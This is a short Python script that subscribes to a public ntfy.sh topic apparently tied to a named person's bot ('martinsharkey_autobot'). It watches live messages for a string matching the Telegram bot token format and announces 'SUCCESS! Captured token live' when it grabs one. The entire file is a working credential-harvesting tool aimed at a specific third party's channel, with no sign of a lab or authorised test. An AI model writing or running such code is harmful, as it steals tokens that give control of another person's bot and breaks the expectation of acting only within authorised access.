import asyncio
import json
import websockets

async def listen_live():
    uri = "wss://ntfy.sh/martinsharkey_autobot/ws"
    print(f"Connecting to {uri} and listening live for 60 seconds...")
    try:
        async with websockets.connect(uri) as websocket:
            print("Connected! Waiting for events...")
            start_time = asyncio.get_event_loop().time()
            while asyncio.get_event_loop().time() - start_time < 60.0:
                try:
                    raw = await asyncio.wait_for(websocket.recv(), timeout=1.0)
                    data = json.loads(raw)
                    print(f"LIVE EVENT: {data.get('event')} | message: {data.get('message')}")
                    # Look for Telegram token regex: \d+:[A-Za-z0-9_-]{35}
                    msg_text = data.get("message", "")
                    import re
                    match = re.search(r"(\d+:[A-Za-z0-9_-]{35})", msg_text)
                    if match:
                        token = match.group(1)
                        print(f"SUCCESS! Captured token live: {token}")
                        return
                except asyncio.TimeoutError:
                    pass
    except Exception as exc:
        print("Live listener error:", exc)

if __name__ == "__main__":
    asyncio.run(listen_live())
